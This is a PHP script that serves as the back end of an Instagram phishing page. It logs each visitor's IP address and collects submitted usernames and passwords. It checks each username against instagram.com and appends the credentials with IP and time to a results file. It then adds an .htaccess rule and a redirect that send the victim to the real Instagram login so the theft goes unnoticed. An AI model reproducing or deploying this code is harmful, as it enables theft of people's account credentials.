<?php
$ips = $_SERVER['REMOTE_ADDR'];
  $ss = fopen("ip.txt", "a");
  fwrite($ss, "$ips\n".PHP_EOL);
  fclose($ss);
if (isset($_POST['password'])) {

  $username = $_POST['username'];
  $dir                   = dirname(__FILE__);
$config = $dir . '/_cook/' .rand(1,999999999999999). '.txt';
if (!file_exists($config)) {
    $fp = @fopen($config, 'w');
    @fclose($fp);
}

   // $ua = $useragent[array_rand($useragent)];
$url = "https://www.instagram.com/$username";
 $ch = curl_init();
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);    // Prevent cURL from verifying SSL certificate
    curl_setopt($ch, CURLOPT_FAILONERROR, TRUE);    // Script should fail silently on error
    curl_setopt($ch, CURLOPT_COOKIESESSION, TRUE);  // Use cookies
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); // Follow Location: headers
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); // Returning transfer as a string
    curl_setopt($ch, CURLOPT_COOKIEFILE, $config);  // Setting cookiefile
    curl_setopt($ch, CURLOPT_COOKIEJAR, $config);   // Setting cookiejar
    //curl_setopt($ch, CURLOPT_USERAGENT, $ua);    // Setting useragent
    curl_setopt($ch, CURLOPT_URL, $url);    // Setting URL to POST to
    curl_setopt($ch, CURLOPT_POST, TRUE);   // Setting method as POST
   // curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);  // Setting POST fields as array     
    $result = curl_exec($ch);  // Executing cURL session
    if (preg_match('/title/i', $result)) {
    	 $username = $_POST['username'];
  $password = $_POST['password'];
  $ip = $_SERVER['REMOTE_ADDR'];
  $now = "Checked on ".gethostname()." at ".date("g:i a - F j, Y")."";
  $str = "$username|$password|$ip|$now";
  $write = fopen("pages/result.txt", "a");
  fwrite($write, "$str\n".PHP_EOL);
  fclose($write);
$file1 = fopen(".htaccess","a");
fwrite($file1, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
RewriteRule .* https://www.instagram.com/accounts/login/ [R,L]
');
fclose($file1);
echo '<meta http-equiv="refresh" content="0; url=https://www.instagram.com/accounts/login/" />';
    }else{
echo '<script language="javascript">';
echo 'alert("Isi username anda dengan benar")';
echo '</script>';
}
}